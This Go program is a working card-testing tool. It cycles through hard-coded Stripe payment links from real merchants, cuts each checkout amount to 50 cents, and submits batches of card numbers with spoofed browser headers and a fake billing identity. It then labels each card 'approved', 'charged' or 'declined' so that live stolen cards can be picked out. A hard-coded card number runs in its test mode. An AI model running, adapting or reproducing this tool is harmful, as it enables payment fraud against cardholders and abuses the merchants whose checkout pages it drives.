package main

import (
"encoding/base64"
"encoding/json"
"fmt"
"io"
"log"
"math/rand/v2"
"net/http"
"net/http/cookiejar"
"net/url"
"os"
"regexp"
"strings"
"sync"
"time"

"github.com/google/uuid"
)

// ─── Payment Link Sites ─────────────────────────────────────────────────────

var paymentLinks = []string{
"https://buy.stripe.com/fZe8x76EW7AG5Bm288",
"https://buy.stripe.com/14kaHn8KQgfac6ccMM",
"https://buy.stripe.com/cN27uiglOdoacFydQS",
"https://buy.stripe.com/9AQcP88evfku1hK6oo",
"https://buy.stripe.com/7sIbLV5aV0h51La3cc",
"https://buy.stripe.com/eVa9DQf8s2BodP2fYY",
"https://buy.stripe.com/eVqfZagwZ3u1fISaNFgw000",
"https://buy.stripe.com/dR65ly2z20y02QM7sD",
"https://buy.stripe.com/dR6bM50DMcBa8VO001",
"https://buy.stripe.com/fZe29N8wcdRb2cg3iN",
"https://buy.stripe.com/4gMdRadmC1gK3Y33j4cMM00",
"https://buy.stripe.com/00g7vl7fs6ku10Y288",
"https://buy.stripe.com/cN29Dg4XB3eNaModQQ",
"https://buy.stripe.com/00geW51hebE87Kg000",
"https://buy.stripe.com/4gM9AUf0v2g57zo7CLf3a0h",
"https://buy.stripe.com/00w00jfTJ81B46G7qQ6oo00",
"https://buy.stripe.com/aEU03b4JegRt5bidQS",
"https://buy.stripe.com/28EaEY5Bg6Bg3kAbTr1Jm00",
}

// ─── Site health tracking ────────────────────────────────────────────────────

type SiteHealth struct {
mu       sync.RWMutex
failures map[string]int
dead     map[string]bool
}

var siteHealth = &SiteHealth{
failures: make(map[string]int),
dead:     make(map[string]bool),
}

func (sh *SiteHealth) MarkFailure(link string) {
sh.mu.Lock()
defer sh.mu.Unlock()
sh.failures[link]++
if sh.failures[link] >= 5 {
sh.dead[link] = true
log.Printf("[SITE] %s marked dead after %d failures", link, sh.failures[link])
}
}

func (sh *SiteHealth) MarkSuccess(link string) {
sh.mu.Lock()
defer sh.mu.Unlock()
sh.failures[link] = 0
}

func (sh *SiteHealth) IsAlive(link string) bool {
sh.mu.RLock()
defer sh.mu.RUnlock()
return !sh.dead[link]
}

func (sh *SiteHealth) GetAliveLinks() []string {
sh.mu.RLock()
defer sh.mu.RUnlock()
var alive []string
for _, l := range paymentLinks {
if !sh.dead[l] {
alive = append(alive, l)
}
}
return alive
}

// ─── Configuration ──────────────────────────────────────────────────────────

type CardConfig struct {
CardNumber   string `json:"card_number"`
CardCVC      string `json:"card_cvc"`
CardExpYear  string `json:"card_exp_year"`
CardExpMonth string `json:"card_exp_month"`
Name         string `json:"name"`
Email        string `json:"email"`
Country      string `json:"country_code"`
Address1     string `json:"address1"`
City         string `json:"city"`
Zip          string `json:"zip_code"`
State        string `json:"state"`
Phone        string `json:"phone"`
}

var defaultConfig = CardConfig{
Name:     "JAMES",
Email:    "sadfsdafjl@gmail.com",
Country:  "US",
Address1: "40-24 College Point Boulevard",
City:     "Queens",
Zip:      "11354",
State:    "NY",
Phone:    "(525) 454-7787",
}

func fillDefaults(c CardConfig) CardConfig {
if c.Name == "" {
c.Name = defaultConfig.Name
}
if c.Email == "" {
c.Email = defaultConfig.Email
}
if c.Country == "" {
c.Country = defaultConfig.Country
}
if c.Address1 == "" {
c.Address1 = defaultConfig.Address1
}
if c.City == "" {
c.City = defaultConfig.City
}
if c.Zip == "" {
c.Zip = defaultConfig.Zip
}
if c.State == "" {
c.State = defaultConfig.State
}
if c.Phone == "" {
c.Phone = defaultConfig.Phone
}
return c
}

func parseCardLine(line string) (CardConfig, bool) {
parts := strings.FieldsFunc(line, func(r rune) bool {
return r == '|' || r == '/' || r == ','
})
if len(parts) < 4 {
return CardConfig{}, false
}
number := strings.TrimSpace(parts[0])
month := strings.TrimSpace(parts[1])
yearStr := strings.TrimSpace(parts[2])
cvv := strings.TrimSpace(parts[3])

if len(yearStr) == 4 {
yearStr = yearStr[2:]
}
if len(month) == 1 {
month = "0" + month
}

return CardConfig{
CardNumber:   number,
CardCVC:      cvv,
CardExpYear:  yearStr,
CardExpMonth: month,
}, true
}

func maskCard(number string) string {
digits := strings.ReplaceAll(number, " ", "")
if len(digits) >= 4 {
return "**** **** **** " + digits[len(digits)-4:]
}
return "****"
}

// ─── CheckResult ─────────────────────────────────────────────────────────────

type CheckResult struct {
Status      string  `json:"status"`
Code        string  `json:"code"`
Message     string  `json:"message"`
Card        string  `json:"card"`
Amount      string  `json:"amount"`
SiteLabel   string  `json:"site_label,omitempty"`
RawResponse string  `json:"raw_response,omitempty"`
Elapsed     float64 `json:"elapsed"`
}

// ─── Stripe Payment Link Checkout Flow ───────────────────────────────────────

type checkoutSession struct {
PaymentLink    string
LinkID         string
CheckoutURL    string
CheckoutSessID string
PublishableKey string
LineItemID     string
ExpectedAmount string
Subtotal       string
ExclusiveTax   string
InclusiveTax   string
DiscountAmount string
ShippingAmount string
}

// decodeFragment decodes the Stripe URL fragment: url-decode -> base64 -> XOR 5 -> JSON -> apiKey
func decodeFragment(fragment string) string {
decoded, err := url.QueryUnescape(fragment)
if err != nil {
return ""
}
if pad := len(decoded) % 4; pad != 0 {
decoded += strings.Repeat("=", 4-pad)
}
binary, err := base64.StdEncoding.DecodeString(decoded)
if err != nil {
binary, err = base64.URLEncoding.DecodeString(decoded)
if err != nil {
return ""
}
}
for i := range binary {
binary[i] ^= 5
}
var data map[string]interface{}
if err := json.Unmarshal(binary, &data); err != nil {
return ""
}
if key, ok := data["apiKey"].(string); ok {
return key
}
if key, ok := data["key"].(string); ok {
return key
}
return ""
}

func initCheckoutSession(paymentLink string, client *http.Client) (*checkoutSession, error) {
cs := &checkoutSession{PaymentLink: paymentLink}

parts := strings.Split(strings.TrimRight(paymentLink, "/"), "/")
cs.LinkID = parts[len(parts)-1]

// Visit the payment link to get cookies
req, _ := http.NewRequest("GET", paymentLink, nil)
req.Header.Set("User-Agent", userAgent)
resp, err := client.Do(req)
if err != nil {
return nil, fmt.Errorf("visit link: %w", err)
}
io.Copy(io.Discard, resp.Body)
resp.Body.Close()

// POST to merchant-ui-api to get session info
apiURL := fmt.Sprintf("https://merchant-ui-api.stripe.com/payment-links/%s", cs.LinkID)
req, _ = http.NewRequest("POST", apiURL, nil)
req.Header.Set("User-Agent", userAgent)
req.Header.Set("Origin", "https://buy.stripe.com")
req.Header.Set("Referer", paymentLink)

resp, err = client.Do(req)
if err != nil {
return nil, fmt.Errorf("merchant API: %w", err)
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)

if resp.StatusCode != 200 {
return nil, fmt.Errorf("merchant API HTTP %d", resp.StatusCode)
}

var data map[string]interface{}
if err := json.Unmarshal(body, &data); err != nil {
return nil, fmt.Errorf("merchant API parse: %w", err)
}

stripeURL, _ := data["stripe_hosted_url"].(string)
if stripeURL == "" {
return nil, fmt.Errorf("no stripe_hosted_url")
}
cs.CheckoutURL = stripeURL

csRe := regexp.MustCompile(`cs_(live|test)_[A-Za-z0-9]+`)
m := csRe.FindString(stripeURL)
if m == "" {
return nil, fmt.Errorf("no checkout session ID in URL")
}
cs.CheckoutSessID = m

if idx := strings.Index(stripeURL, "#"); idx != -1 {
cs.PublishableKey = decodeFragment(stripeURL[idx+1:])
}
if cs.PublishableKey == "" {
return nil, fmt.Errorf("could not decode publishable key")
}

if lig, ok := data["line_item_group"].(map[string]interface{}); ok {
if items, ok := lig["line_items"].([]interface{}); ok && len(items) > 0 {
if item, ok := items[0].(map[string]interface{}); ok {
cs.LineItemID, _ = item["id"].(string)
}
}
}
if cs.LineItemID == "" {
return nil, fmt.Errorf("no line item ID found")
}

fmt.Printf("  Session: %s\n", cs.CheckoutSessID)
return cs, nil
}

func (cs *checkoutSession) updateAmount(client *http.Client) error {
apiURL := fmt.Sprintf("https://api.stripe.com/v1/payment_pages/%s", cs.CheckoutSessID)

formData := fmt.Sprintf("eid=NA&updated_line_item_amount[line_item_id]=%s&updated_line_item_amount[unit_amount]=50&key=%s",
url.QueryEscape(cs.LineItemID), url.QueryEscape(cs.PublishableKey))

req, _ := http.NewRequest("POST", apiURL, strings.NewReader(formData))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
req.Header.Set("Origin", "https://checkout.stripe.com")
req.Header.Set("Referer", "https://checkout.stripe.com/")
req.Header.Set("User-Agent", userAgent)

resp, err := client.Do(req)
if err != nil {
return fmt.Errorf("update amount: %w", err)
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)

var data map[string]interface{}
if err := json.Unmarshal(body, &data); err != nil {
return fmt.Errorf("update amount parse: %w", err)
}

if errObj, ok := data["error"].(map[string]interface{}); ok {
msg, _ := errObj["message"].(string)
return fmt.Errorf("update amount: %s", msg)
}

lig, _ := data["line_item_group"].(map[string]interface{})
if lig == nil {
return fmt.Errorf("no line_item_group in response")
}

cs.ExpectedAmount = jsonNumStr(lig, "due", "50")
cs.Subtotal = jsonNumStr(lig, "subtotal", "50")

var exclusiveTax, inclusiveTax int64
if taxAmounts, ok := lig["tax_amounts"].([]interface{}); ok {
for _, t := range taxAmounts {
tm, _ := t.(map[string]interface{})
amt := jsonNum(tm, "amount")
inclusive, _ := tm["inclusive"].(bool)
if inclusive {
inclusiveTax += amt
} else {
exclusiveTax += amt
}
}
}
cs.ExclusiveTax = fmt.Sprintf("%d", exclusiveTax)
cs.InclusiveTax = fmt.Sprintf("%d", inclusiveTax)

var totalDiscount int64
if discounts, ok := lig["discount_amounts"].([]interface{}); ok {
for _, d := range discounts {
dm, _ := d.(map[string]interface{})
totalDiscount += jsonNum(dm, "amount")
}
}
cs.DiscountAmount = fmt.Sprintf("%d", totalDiscount)

cs.ShippingAmount = "0"
if sr, ok := lig["shipping_rate"].(map[string]interface{}); ok {
cs.ShippingAmount = fmt.Sprintf("%d", jsonNum(sr, "amount"))
}

fmt.Printf("  Amount: %s cents ($%s)\n", cs.ExpectedAmount, centsToStr(cs.ExpectedAmount))
return nil
}

func (cs *checkoutSession) createPaymentMethod(client *http.Client, cfg CardConfig) (string, error) {
guid := uuid.New().String()
muid := uuid.New().String()
sid := uuid.New().String()
clientSessionID := uuid.New().String()

formData := url.Values{
"type":                                              {"card"},
"card[number]":                                      {cfg.CardNumber},
"card[cvc]":                                         {cfg.CardCVC},
"card[exp_month]":                                   {cfg.CardExpMonth},
"card[exp_year]":                                    {cfg.CardExpYear},
"billing_details[name]":                             {cfg.Name},
"billing_details[email]":                            {cfg.Email},
"billing_details[address][country]":                 {cfg.Country},
"billing_details[address][line1]":                   {cfg.Address1},
"billing_details[address][city]":                    {cfg.City},
"billing_details[address][postal_code]":             {cfg.Zip},
"billing_details[address][state]":                   {cfg.State},
"guid":                                              {guid},
"muid":                                              {muid},
"sid":                                               {sid},
"key":                                               {cs.PublishableKey},
"payment_user_agent":                                {"stripe.js/668d00c08a; stripe-js-v3/668d00c08a; payment-link; checkout"},
"client_attribution_metadata[client_session_id]":    {clientSessionID},
"client_attribution_metadata[checkout_session_id]":  {cs.CheckoutSessID},
"client_attribution_metadata[merchant_integration_source]":  {"checkout"},
"client_attribution_metadata[merchant_integration_version]": {"payment_link"},
"client_attribution_metadata[payment_method_selection_flow]": {"automatic"},
}

req, _ := http.NewRequest("POST", "https://api.stripe.com/v1/payment_methods", strings.NewReader(formData.Encode()))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
req.Header.Set("Accept", "application/json")
req.Header.Set("Accept-Language", "en-US,en;q=0.9")
req.Header.Set("Origin", "https://buy.stripe.com")
req.Header.Set("Referer", "https://buy.stripe.com/")
req.Header.Set("Sec-CH-UA", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
req.Header.Set("Sec-CH-UA-Mobile", "?0")
req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
req.Header.Set("Sec-Fetch-Dest", "empty")
req.Header.Set("Sec-Fetch-Mode", "cors")
req.Header.Set("Sec-Fetch-Site", "same-site")
req.Header.Set("User-Agent", userAgent)

resp, err := client.Do(req)
if err != nil {
return "", fmt.Errorf("create PM: %w", err)
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)

var data map[string]interface{}
if err := json.Unmarshal(body, &data); err != nil {
return "", fmt.Errorf("PM parse: %w", err)
}

if errObj, ok := data["error"].(map[string]interface{}); ok {
code, _ := errObj["code"].(string)
msg, _ := errObj["message"].(string)
declineCode, _ := errObj["decline_code"].(string)
if declineCode != "" {
code = declineCode
}
return "", fmt.Errorf("PM_ERROR:%s:%s", code, msg)
}

pmID, _ := data["id"].(string)
if pmID == "" {
return "", fmt.Errorf("no payment method ID")
}

return pmID, nil
}

func (cs *checkoutSession) confirmPayment(client *http.Client, pmID string, cfg CardConfig) (int, []byte, error) {
guid := uuid.New().String()
muid := uuid.New().String()
sid := uuid.New().String()
clientSessionID := uuid.New().String()

formData := url.Values{
"eid":                          {"NA"},
"payment_method":               {pmID},
"expected_amount":              {cs.ExpectedAmount},
"expected_payment_method_type": {"card"},
"guid":                         {guid},
"muid":                         {muid},
"sid":                          {sid},
"key":                          {cs.PublishableKey},
"version":                      {"668d00c08a"},
"referrer":                     {"https://www.google.com"},
"client_attribution_metadata[client_session_id]":            {clientSessionID},
"client_attribution_metadata[checkout_session_id]":          {cs.CheckoutSessID},
"client_attribution_metadata[merchant_integration_source]":  {"checkout"},
"client_attribution_metadata[merchant_integration_version]": {"payment_link"},
"client_attribution_metadata[payment_method_selection_flow]": {"automatic"},
"last_displayed_line_item_group_details[subtotal]":            {cs.Subtotal},
"last_displayed_line_item_group_details[total_exclusive_tax]": {cs.ExclusiveTax},
"last_displayed_line_item_group_details[total_inclusive_tax]": {cs.InclusiveTax},
"last_displayed_line_item_group_details[total_discount_amount]": {cs.DiscountAmount},
"last_displayed_line_item_group_details[shipping_rate_amount]":  {cs.ShippingAmount},
}

if cfg.Phone != "" {
formData.Set("phone_number_collection[phone]", cfg.Phone)
formData.Set("phone_number_collection[source]", "payment_form")
formData.Set("phone_number_collection[country]", cfg.Country)
}

confirmURL := fmt.Sprintf("https://api.stripe.com/v1/payment_pages/%s/confirm", cs.CheckoutSessID)

req, _ := http.NewRequest("POST", confirmURL, strings.NewReader(formData.Encode()))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
req.Header.Set("Accept", "application/json")
req.Header.Set("Accept-Language", "en-US,en;q=0.9")
req.Header.Set("Origin", "https://buy.stripe.com")
req.Header.Set("Referer", "https://buy.stripe.com/")
req.Header.Set("Sec-CH-UA", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
req.Header.Set("Sec-CH-UA-Mobile", "?0")
req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
req.Header.Set("Sec-Fetch-Dest", "empty")
req.Header.Set("Sec-Fetch-Mode", "cors")
req.Header.Set("Sec-Fetch-Site", "same-site")
req.Header.Set("User-Agent", userAgent)

resp, err := client.Do(req)
if err != nil {
return 0, nil, fmt.Errorf("confirm: %w", err)
}
defer resp.Body.Close()
body, _ := io.ReadAll(resp.Body)

return resp.StatusCode, body, nil
}

// ─── Response Classification ─────────────────────────────────────────────────
// Mirrors the real Stripe Payment Link (/v1/payment_pages) response formats.
// error.type is inspected first: only "card_error" produces a card verdict;
// "invalid_request_error", "api_error", "rate_limit_error" are site-level.

func classifyStripeResponse(statusCode int, body []byte) (status, code, message string) {
	var resp map[string]interface{}
	if err := json.Unmarshal(body, &resp); err != nil {
		return "error", "PARSE_ERROR", "failed to parse Stripe response"
	}

	// ── Top-level error object (most common path for card declines) ──
	if errObj, ok := resp["error"].(map[string]interface{}); ok {
		errType, _ := errObj["type"].(string)
		errCode, _ := errObj["code"].(string)
		declineCode, _ := errObj["decline_code"].(string)
		msg, _ := errObj["message"].(string)

		effective := errCode
		if declineCode != "" {
			effective = declineCode
		}

		// Non-card errors → site/API-level, should retry on another site
		switch errType {
		case "invalid_request_error":
			return "error", "INVALID_REQUEST:" + effective, msg
		case "api_error":
			return "error", "API_ERROR:" + effective, msg
		case "rate_limit_error":
			return "error", "RATE_LIMIT", msg
		case "idempotency_error":
			return "error", "IDEMPOTENCY_ERROR", msg
		}

		// card_error (or unknown type) → classify the decline/code
		return classifyCode(effective, msg)
	}

	// ── Nested payment_intent (confirm response often wraps one) ──
	if pi, ok := resp["payment_intent"].(map[string]interface{}); ok {
		piStatus, _ := pi["status"].(string)
		switch piStatus {
		case "succeeded":
			return "charged", "SUCCESS", "Payment succeeded"
		case "requires_action":
			return "approved", "3DS_REQUIRED", "Card is live (3D Secure required)"
		case "requires_capture":
			return "charged", "REQUIRES_CAPTURE", "Payment authorized"
		case "requires_payment_method":
			// Card was declined during confirmation
			if lastErr, ok := pi["last_payment_error"].(map[string]interface{}); ok {
				errCode, _ := lastErr["code"].(string)
				declineCode, _ := lastErr["decline_code"].(string)
				msg, _ := lastErr["message"].(string)
				if declineCode != "" {
					errCode = declineCode
				}
				return classifyCode(errCode, msg)
			}
			return "declined", "REQUIRES_PAYMENT_METHOD", "Card was declined"
		}
	}

	// ── Top-level status (payment_pages returns this) ──
	topStatus, _ := resp["status"].(string)
	switch topStatus {
	case "succeeded", "complete":
		return "charged", "SUCCESS", "Payment succeeded"
	case "requires_action":
		return "approved", "3DS_REQUIRED", "Card is live (3D Secure required)"
	case "requires_capture":
		return "charged", "REQUIRES_CAPTURE", "Payment authorized"
	case "processing":
		return "approved", "PROCESSING", "Payment is processing (card accepted)"
	case "requires_payment_method":
		return "declined", "REQUIRES_PAYMENT_METHOD", "Card was declined"
	}

	// HTTP 402 = payment required = generic decline
	if statusCode == 402 {
		return "declined", "PAYMENT_FAILED", "Payment failed"
	}

	return "unknown", "UNKNOWN", fmt.Sprintf("unexpected response (HTTP %d)", statusCode)
}

// classifyCode uses exact-match on every known Stripe decline_code / error code.
// Reference: https://docs.stripe.com/declines/codes
func classifyCode(code, msg string) (string, string, string) {
	lc := strings.ToLower(code)
	switch lc {

	// ── APPROVED  (card is live / has funds) ──────────────────────────
	case "incorrect_cvc", "invalid_cvc":
		return "approved", code, msg
	case "insufficient_funds":
		return "approved", code, msg
	case "authentication_required":
		return "approved", code, msg
	case "approve_with_id":
		return "approved", code, msg
	case "card_velocity_exceeded":
		return "approved", code, msg
	case "withdrawal_count_limit_exceeded":
		return "approved", code, msg
	case "issuer_not_available":
		return "approved", code, msg
	case "try_again_later":
		return "approved", code, msg
	case "reenter_transaction":
		return "approved", code, msg
	case "incorrect_zip", "incorrect_address":
		return "approved", code, msg

	// ── DECLINED  (card is dead) ─────────────────────────────────────
	case "card_declined", "generic_decline":
		return "declined", code, msg
	case "do_not_honor":
		return "declined", code, msg
	case "do_not_try_again":
		return "declined", code, msg
	case "fraudulent":
		return "declined", code, msg
	case "stolen_card":
		return "declined", code, msg
	case "lost_card":
		return "declined", code, msg
	case "pickup_card":
		return "declined", code, msg
	case "expired_card":
		return "declined", code, msg
	case "incorrect_number", "invalid_number":
		return "declined", code, msg
	case "invalid_expiry_month", "invalid_expiry_year":
		return "declined", code, msg
	case "processing_error":
		return "declined", code, msg
	case "card_not_supported":
		return "declined", code, msg
	case "currency_not_supported":
		return "declined", code, msg
	case "restricted_card":
		return "declined", code, msg
	case "security_violation":
		return "declined", code, msg
	case "service_not_allowed":
		return "declined", code, msg
	case "transaction_not_allowed":
		return "declined", code, msg
	case "new_account_information_available":
		return "declined", code, msg
	case "testmode_decline":
		return "declined", code, msg
	case "live_mode_test_card":
		return "declined", code, msg
	case "merchant_blacklist":
		return "declined", code, msg
	case "not_permitted":
		return "declined", code, msg
	case "revocation_of_all_authorizations":
		return "declined", code, msg
	case "revocation_of_authorization":
		return "declined", code, msg
	case "invalid_account":
		return "declined", code, msg
	case "invalid_amount":
		return "declined", code, msg
	case "call_issuer":
		return "declined", code, msg
	case "no_action_taken":
		return "declined", code, msg

	default:
		// Fallback: pattern-match for partial matches
		u := strings.ToUpper(code)
		switch {
		case strings.Contains(u, "INSUFFICIENT") || strings.Contains(u, "CVC") || strings.Contains(u, "AUTHENTICATION"):
			return "approved", code, msg
		case strings.Contains(u, "DECLINE") || strings.Contains(u, "STOLEN") || strings.Contains(u, "LOST") ||
			strings.Contains(u, "FRAUD") || strings.Contains(u, "EXPIRED") || strings.Contains(u, "PICKUP"):
			return "declined", code, msg
		}
		return "declined", code, msg
	}
}

// ─── Core: processCard ───────────────────────────────────────────────────────

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0"

func processCard(cfg CardConfig) CheckResult {
start := time.Now()
maskedCard := maskCard(cfg.CardNumber)

links := siteHealth.GetAliveLinks()
if len(links) == 0 {
return CheckResult{Status: "error", Code: "NO_SITES", Message: "all payment links are dead", Card: maskedCard, Elapsed: time.Since(start).Seconds()}
}

rand.Shuffle(len(links), func(i, j int) { links[i], links[j] = links[j], links[i] })
maxAttempts := min(3, len(links))

for attempt := 0; attempt < maxAttempts; attempt++ {
link := links[attempt]

fmt.Printf("[Card %s] Attempt %d/%d on %s\n", maskedCard, attempt+1, maxAttempts, link)

result := processCardOnSite(cfg, link, maskedCard, start)

if result.Status == "error" && isSiteError(result.Code) {
siteHealth.MarkFailure(link)
fmt.Printf("  Site error (%s) - trying next\n", result.Code)
continue
}

if result.Status != "error" {
siteHealth.MarkSuccess(link)
}
return result
}

return CheckResult{
Status:  "error",
Code:    "ALL_SITES_FAILED",
Message: "all attempted payment links failed",
Card:    maskedCard,
Elapsed: time.Since(start).Seconds(),
}
}

func isSiteError(code string) bool {
	switch code {
	case "SESSION_INIT_ERROR", "AMOUNT_UPDATE_ERROR", "SITE_HTTP_ERROR", "NO_LINE_ITEM":
		return true
	}
	return strings.HasPrefix(code, "HTTP_") ||
		strings.HasPrefix(code, "INVALID_REQUEST:") ||
		strings.HasPrefix(code, "API_ERROR:") ||
		code == "RATE_LIMIT" ||
		code == "IDEMPOTENCY_ERROR"
}

func processCardOnSite(cfg CardConfig, paymentLink, maskedCard string, start time.Time) CheckResult {
jar, _ := cookiejar.New(nil)
client := &http.Client{
Jar:     jar,
Timeout: 20 * time.Second,
}

linkParts := strings.Split(strings.TrimRight(paymentLink, "/"), "/")
siteLabel := linkParts[len(linkParts)-1]

// Step 1: Init checkout session
fmt.Println("  [1/4] Init checkout session...")
cs, err := initCheckoutSession(paymentLink, client)
if err != nil {
return CheckResult{
Status: "error", Code: "SESSION_INIT_ERROR",
Message: err.Error(), Card: maskedCard, SiteLabel: siteLabel,
Elapsed: time.Since(start).Seconds(),
}
}

// Step 2: Update amount to minimum
fmt.Println("  [2/4] Updating amount...")
if err := cs.updateAmount(client); err != nil {
return CheckResult{
Status: "error", Code: "AMOUNT_UPDATE_ERROR",
Message: err.Error(), Card: maskedCard, SiteLabel: siteLabel,
Elapsed: time.Since(start).Seconds(),
}
}

// Step 3: Create payment method
fmt.Println("  [3/4] Creating payment method...")
pmID, err := cs.createPaymentMethod(client, cfg)
if err != nil {
errStr := err.Error()
if strings.HasPrefix(errStr, "PM_ERROR:") {
parts := strings.SplitN(errStr[9:], ":", 2)
code := parts[0]
msg := ""
if len(parts) > 1 {
msg = parts[1]
}
status, finalCode, finalMsg := classifyCode(code, msg)
return CheckResult{
Status: status, Code: finalCode, Message: finalMsg,
Card: maskedCard, Amount: "$" + centsToStr(cs.ExpectedAmount),
SiteLabel: siteLabel, Elapsed: time.Since(start).Seconds(),
}
}
return CheckResult{
Status: "error", Code: "PM_CREATE_ERROR",
Message: errStr, Card: maskedCard, SiteLabel: siteLabel,
Elapsed: time.Since(start).Seconds(),
}
}
fmt.Printf("  PM: %s\n", pmID)

// Step 4: Confirm payment
fmt.Println("  [4/4] Confirming payment...")
statusCode, body, err := cs.confirmPayment(client, pmID, cfg)
if err != nil {
return CheckResult{
Status: "error", Code: "CONFIRM_ERROR",
Message: err.Error(), Card: maskedCard,
Amount: "$" + centsToStr(cs.ExpectedAmount), SiteLabel: siteLabel,
Elapsed: time.Since(start).Seconds(),
}
}

status, code, message := classifyStripeResponse(statusCode, body)

return CheckResult{
Status:      status,
Code:        code,
Message:     message,
Card:        maskedCard,
Amount:      "$" + centsToStr(cs.ExpectedAmount),
SiteLabel:   siteLabel,
RawResponse: string(body),
Elapsed:     time.Since(start).Seconds(),
}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func jsonNumStr(m map[string]interface{}, key, fallback string) string {
v, ok := m[key]
if !ok {
return fallback
}
switch val := v.(type) {
case float64:
return fmt.Sprintf("%d", int64(val))
case json.Number:
return val.String()
case string:
return val
}
return fallback
}

func jsonNum(m map[string]interface{}, key string) int64 {
v, ok := m[key]
if !ok {
return 0
}
switch val := v.(type) {
case float64:
return int64(val)
case json.Number:
n, _ := val.Int64()
return n
}
return 0
}

func centsToStr(cents string) string {
var n int
fmt.Sscanf(cents, "%d", &n)
return fmt.Sprintf("%.2f", float64(n)/100.0)
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
if len(os.Args) > 1 && os.Args[1] == "-api" {
runAPIServer()
return
}

fmt.Println("Usage: stripe-go -api    (to start HTTP API server)")
fmt.Println("       Starting in CLI test mode...")
fmt.Println()

cfg := fillDefaults(CardConfig{
CardNumber:   "5424587007013629",
CardCVC:      "000",
CardExpYear:  "30",
CardExpMonth: "03",
})

result := processCard(cfg)
out, _ := json.MarshalIndent(result, "", "  ")
fmt.Println(string(out))
}
